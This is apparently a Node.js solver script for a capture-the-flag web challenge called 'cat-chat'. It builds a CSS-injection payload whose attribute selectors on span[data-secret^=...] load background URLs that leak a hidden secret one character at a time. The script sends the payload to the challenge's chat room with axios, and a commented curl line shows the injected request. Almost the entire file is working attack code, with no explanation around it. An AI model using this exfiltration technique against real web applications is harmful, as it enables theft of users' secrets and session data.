const axios = require('axios');

const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-}';

console.log(process.argv[2]);
let pass = process.argv[2]; //'CTF{L0';
let payload = '';
for (var i = 0; i < charset.length; i++) {
    const val = (pass + charset[i]).replace('{', '\\\{').replace('}', '\\\}');
    const msg = (pass + charset[i]).replace(/[\{\}]/g, '.');
    payload += `span[data-secret^=${val}]{background:url(send?name=admin%26msg=${msg})}`;
}

payload = `]{}body{background:url(send?name=admin%26msg=/secret+caca;domain=google.com)}${payload}div[`

console.log(payload);

/*
curl 'https://cat-chat.web.ctfcompetition.com/room/40bf4c77-1475-4370-a168-d8f74332b84b/send?name=%5D%7B%7Dbody%7Bbackground%3Aurl(send%3Fname%3Dadmin&msg%3Dcaca)%7Ddiv%5B&msg=dog%20' -H 'dnt: 1' -H 'accept-encoding: gzip, deflate, br' -H 'accept-language: en-US,en;q=0.9,ro;q=0.8' -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36' -H 'referer: https://cat-chat.web.ctfcompetition.com/room/40bf4c77-1475-4370-a168-d8f74332b84b/' -H 'authority: cat-chat.web.ctfcompetition.com' --compressed
*/
axios({
    method: 'get',
    url: `https://cat-chat.web.ctfcompetition.com/room/40bf4c77-1475-4370-a168-d8f74332b84b/send?name=${payload}&msg=dog`,
    headers: {
        referer: 'https://cat-chat.web.ctfcompetition.com/room/40bf4c77-1475-4370-a168-d8f74332b84b/'
    }
}).then((response) => {
    console.log(response.data);
}).catch((err) => {
    console.error(err);
});
